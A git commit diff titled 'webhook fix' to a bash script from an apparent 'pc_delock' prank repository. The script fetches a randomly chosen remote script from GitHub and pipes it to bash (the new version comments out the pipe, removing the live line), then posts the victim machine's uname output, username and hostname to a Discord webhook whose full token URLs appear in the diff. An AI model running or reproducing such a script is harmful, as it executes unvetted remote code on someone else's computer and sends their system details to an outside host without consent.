374fcf23e11f55accf93c8e7b7016fc2e33d3a18
Waz0x <remy.noulin@epitech.eu>
2021-10-07 10:48:35 +0200

    webhook fix

--- script.sh
+++ script.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-WEBHOOK_URL="https://discord.com/api/webhooks/885524612589424640/zxAk5zfwuSbb0Pd1---PJzi6m68BD1YHYOSia8cAnrmtCfPXcUhLZ3ZXv95EqpW9pp9f"
+WEBHOOK_URL="https://discord.com/api/webhooks/895593267205394473/oq1QICNWHvypGXHu7AUoY5j1BD46CMv1TjD93KMxch1rU0niCLWFYjy0jK5ADhA99-ut"
 rdm=$(( RANDOM % 15 ))
 
-curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
+curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" #| bash
 curl \
   -H "Content-Type: application/json" \
   -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
